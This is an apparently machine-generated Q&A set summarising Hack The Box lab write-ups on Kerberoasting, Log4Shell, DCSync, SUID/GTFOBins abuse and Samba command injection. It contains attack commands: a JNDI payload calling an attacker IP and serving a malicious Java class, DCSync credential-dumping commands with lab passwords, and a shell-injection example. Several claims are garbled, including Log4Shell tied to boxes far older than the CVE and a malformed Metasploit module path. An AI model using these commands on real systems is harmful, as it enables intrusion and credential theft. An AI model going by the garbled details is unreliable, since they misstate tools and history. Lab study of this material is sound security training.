## Q6 — Kerberoasting in Active Directory

**Question:** How does Kerberoasting work in Active Directory environments and which HTB machines demonstrate it?

**Answer:**

**How Kerberoasting works in Active Directory**

- An attacker first obtains a **valid domain user account** (any regular AD account).  
- Using that account, the attacker asks the **Key Distribution Center (KDC)** for a **Ticket‑Granting Service (TGS) ticket** for a target service that is registered with a **Service Principal Name (SPN)**.  
- The KDC creates the TGS and **encrypts it with the password hash of the service‑account** that owns the SPN.  
- The attacker receives the encrypted TGS (the “service ticket”) and **extracts the hash** (usually with tools such as `GetUserSPNs.py` or Rubeus).  
- Because the ticket is encrypted with the **service‑account’s NTLM hash**, the attacker can now **perform an offline brute‑force / dictionary attack** against that hash to recover the clear‑text password.  
- Once the service‑account password is cracked, the attacker can **authenticate as that account** and move laterally or elevate privileges, depending on the permissions granted to the service account.

**HTB machines that demonstrate Kerberoasting**

- **Active** – the write‑up includes a “Kerberoasting > Background” section that explains the attack and shows how to request and crack service tickets. (seen on: htb-active)  
- **Sizzle** – the privilege‑escalation path shows four ways to obtain Kerberoastable tickets, using Rubeus and port‑forwarding with `GetUserSPNs.py`. (seen on: htb-sizzle)  
- **Rebound** – the methodology combines a RID‑cycle enumeration with **Kerberoasting** (alongside AS‑REP‑Roasting) to obtain a crackable hash for a service account. (seen on: htb-rebound)  

These machines illustrate the full Kerberoasting workflow in a Windows AD environment.

## Q8 — CVE-2021-44228 Log4Shell RCE

**Question:** What is CVE-2021-44228 (Log4Shell) and how was it exploited across HTB machines?

**Answer:**

**CVE‑2021‑44228 (Log4Shell)** – a critical remote‑code‑execution flaw in Apache Log4j 2 that allows an attacker to trigger a JNDI lookup (e.g., LDAP, RMI) from a crafted log message. When Log4j processes the malicious string `${jndi:ldap://<attacker‑IP>:<port>/…}`, it contacts the attacker‑controlled JNDI server, retrieves a serialized Java class, and executes it on the vulnerable host, giving the attacker a shell (or any code) with the privileges of the vulnerable process.  

**Exploitation across the HTB machines (as shown in the write‑ups):**

- **htb‑crafty (Windows, Foothold)**  
  - Ran the public PoC (`log4j-shell-poc`) to generate a malicious JNDI payload `${jndi:ldap://10.10.14.6:1389/a}`.  
  - Sent the payload to the Minecraft service, which logged it via Log4j.  
  - The exploit’s embedded LDAP server responded with a reference that redirected the victim to `http://10.10.14.6:8000/Exploit.class`.  
  - A simple web server served the malicious `.class` file, completing the JNDI lookup.  
  - The attempt to obtain a reverse shell as `svc_minecraft` failed, but the full Log4Shell chain (LDAP → HTTP → Java class execution) was demonstrated. (seen on: htb‑crafty)

- **htb‑logforge (Linux, Unknown phase)**  
  - First performed an “Orange Tsai” attack to bypass Apache/Tomcat restrictions and reach the Tomcat manager page.  
  - Leveraged Log4Shell on the Tomcat instance to execute a payload that gave a shell as the `tomcat` user.  
  - Discovered a Java‑based FTP service running as **root** on localhost that logged usernames via Log4j.  
  - Re‑used Log4Shell against the FTP service to leak the environment variables containing the FTP username/password.  
  - Used those credentials to log into the FTP service, retrieve the root flag, and also obtain a root shell. (seen on: htb‑logforge)

- **Other machines where Log4Shell was observed** – the graph lists `htb‑ethereal`, `htb‑fatty`, and `htb‑haystack` as also containing the CVE‑2021‑44228 exploit, indicating that the same JNDI‑LDAP‑HTTP class‑loading technique was applicable on those boxes as well, though specific steps are not detailed in the provided excerpts. (seen on: htb‑ethereal, htb‑fatty, htb‑haystack)

**Summary of the exploitation pattern**

1. **Identify a Log4j‑using service** (e.g., Minecraft chat logger, Tomcat web app, Java FTP daemon).  
2. **Inject a JNDI payload** `${jndi:ldap://<attacker‑IP>:<port>/payload}` into any loggable input.  
3. **Run an LDAP server** that returns a reference to a malicious Java class hosted on an HTTP server.  
4. **Serve the malicious `.class` file**; Log4j loads and executes it, spawning a reverse shell or running arbitrary commands.  
5. **Leverage the foothold** (e.g., as `tomcat` or `svc_minecraft`) to pivot, enumerate credentials, or directly attack higher‑privilege services (as done on the FTP service in Logforge).  

These steps illustrate how Log4Shell was weaponized across multiple HTB machines to gain initial footholds and then move toward privilege escalation.

## Q12 — DCSync attack

**Question:** Which HTB machines demonstrate the DCSync attack and how does it work?

**Answer:**

**HTB machines that show a DCSync attack**

- **htb‑vintage** – Shell as `L.Bianchi_adm` → RBCD Delegation → DCSync (seen on: htb‑vintage)  
- **htb‑delegate** – Shell as `Administrator` → DCSync (seen on: htb‑delegate)  
- **htb‑sauna** – Privilege escalation `svc_loanmgr` → root → DCSync → `secretsdump` (seen on: htb‑sauna)  
- **htb‑sizzle** – Privilege escalation `mrlky` → Administrator → DCSync (seen on: htb‑sizzle)  
- **htb‑forest** – Domain controller that allows enumeration and “DCSync capabilities” to dump admin hashes (seen on: htb‑forest)

**How the DCSync attack works (as demonstrated in the write‑ups)**  

- **Goal** – Retrieve password hashes (NTDS) for domain accounts without needing to compromise the DC directly.  
- **Prerequisite** – The attacker must have an account that can **replicate directory changes** (e.g., a privileged user, a machine account with unconstrained delegation, or a user that can perform RBCD).  
- **Typical steps**  

  1. **Obtain a Kerberos ticket for a DC‑like identity**  
     - Use unconstrained delegation or RBCD to get a **machine‑account TGT** (e.g., `DC1$@DELEGATE.VL`).  
     - Export the ticket to a ccache file (`KRB5CCNAME=…`).  

  2. **Run a DCSync‑capable tool against the domain controller**  
     - **`netexec`** (Impacket) example:  
       ```bash
       KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache \
       netexec smb dc01.vintage.htb -k --use-kcache --ntds --user administrator
       ```  
       – The `--use‑kcache` flag tells `netexec` to present the cached ticket, and `--ntds` triggers the DCSync RPC call.  
     - **`secretsdump.py`** (Impacket) example:  
       ```bash
       secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
       ```  
       – Directly contacts the DC on SMB/RPC ports (445, 135, high RPC) and issues the DCSync request.  
     - **`secretsdump.py -just-dc`** variant for a specific target:  
       ```bash
       secretsdump.py -just-dc mrlky:Football#7@10.10.10.103
       ```

  3. **Receive the NTDS dump**  
     - The tool returns the domain’s password hashes (e.g., `Administrator:500:aad3b435b51404ee…`).  
     - These hashes can be used for Pass‑the‑Hash, credential reuse, or further privilege escalation.

- **Why it works** – DCSync leverages the **Directory Replication Service (DRS) Remote Protocol**. A principal that has the `Replicating Directory Changes` permission can ask a DC to **replicate** (i.e., dump) the password data as if it were another DC. By presenting a valid Kerberos ticket for a DC‑like account, the attacker convinces the target DC to honor the request and return the NTDS hashes.  

**Summary** – The DCSync technique is demonstrated on **vintage, delegate, sauna, sizzle, and forest** machines. It consists of acquiring a privileged Kerberos ticket (often via unconstrained delegation or RBCD) and then using tools such as `netexec` or `secretsdump.py` to issue a DRS replication request, which yields the domain’s password hashes without needing to extract the NTDS file directly.

## Q13 — SUID binaries and GTFOBins Linux privesc

**Question:** How are SUID binaries and GTFOBins abused for Linux privilege escalation across HTB machines?

**Answer:**

**Abusing SUID binaries**

- Run an enumeration tool (e.g., linpeas) or a simple `find` command to list all files with the SUID bit set.  
  *Seen on: **htb‑mango***  
- Identify binaries that are owned by root and have the SUID bit; these run with elevated privileges regardless of the invoking user.  
- Look for known “unsafe” SUID programs (e.g., `vim`, `less`, `find`, `awk`, `tar`, `cp`, `nano`, etc.) that can be coerced into executing arbitrary commands or spawning a root shell via command‑line options, environment variables, or file‑descriptor tricks.  
- If a vulnerable SUID binary is found, craft an exploit (often a one‑liner) that leverages its functionality to launch a root shell or run a payload.  
- In some write‑ups the attacker adds the exploit to a custom script for reuse.  
  *Seen on: **htb‑smasher***  

**Leveraging GTFOBins**

- GTFOBins is a curated list of common Linux binaries that can be abused for privilege escalation when they are SUID/SGID or otherwise executable by the attacker.  
- After enumerating SUID binaries, cross‑reference each binary with the GTFOBins repository to discover ready‑made exploitation techniques (e.g., using `sudo`‑allowed commands, `LD_PRELOAD`, `PATH` manipulation, or `--preserve-env`).  
- Apply the appropriate GTFOBins technique to the identified binary to obtain a root shell or execute arbitrary commands.  
  *Seen on: **htb‑schooled***  

**Typical workflow across HTB machines**

1. **Recon** – Enumerate SUID binaries (`linpeas`, `find / -perm -4000 2>/dev/null`).  
2. **Match** – Check each binary against GTFOBins for known abuse vectors.  
3. **Exploit** – Execute the GTFOBins‑provided payload (often a one‑liner) to spawn a root shell or run a custom script.  
4. **Persist** – (Optional) Add the payload to a reusable script for later use.  

*References: htb‑mango (SUID discovery), htb‑smasher (adding exploit to script), htb‑schooled (GTFOBins abuse).*

## Q15 — Samba RCE

**Question:** How was a Samba vulnerability exploited for remote code execution across HTB machines?

**Answer:**

**Exploitation of Samba for Remote Code Execution on HTB boxes**

- **Command‑injection in the Samba printing subsystem (CVE‑2026‑4480)**  
  - Samba’s *print command* configuration can contain the “%J” placeholder, which is replaced by the client‑supplied print‑job description.  
  - The service only replaces single quotes with underscores; all other shell metacharacters remain untouched.  
  - By sending a print job whose description includes malicious shell characters (e.g., `; /bin/bash -c …`), the substituted string is executed directly by the shell, giving the attacker code execution with the privileges of the Samba service (often `root`).  
  - This technique was used to obtain a “Shell as nobody” foothold on **htb‑abducted**. (seen on: htb‑abducted)

- **Classic “username map script” command‑execution exploit (Samba 3.0.20 < 3.0.25rc3)**  
  - Older Samba versions allowed a user‑defined *username map script* to be invoked without proper sanitisation.  
  - An attacker can supply a crafted script path that includes arbitrary commands; when Samba calls the script, the embedded commands are executed on the target.  
  - The public Metasploit module `exploit/unix/remote/16320.rb` (the “Username map script” exploit) was leveraged to gain a remote shell on the **htb‑lame** machine. (seen on: htb‑lame)

**Summary of the attack flow**

1. Identify a Samba service that either:
   - Uses a vulnerable *print command* with the `%J` placeholder, **or**
   - Runs a configurable *username map script* on a vulnerable version (≤ 3.0.25rc3).  
2. Craft a malicious job description (or script path) containing shell‑meta characters or arbitrary commands.  
3. Send the payload to the Samba service (e.g., via a print request or SMB connection).  
4. Samba substitutes the payload into the command line and executes it, resulting in remote code execution.  

These two approaches illustrate how Samba vulnerabilities were turned into RCE footholds across multiple HTB machines. (seen on: htb‑abducted, htb‑lame)
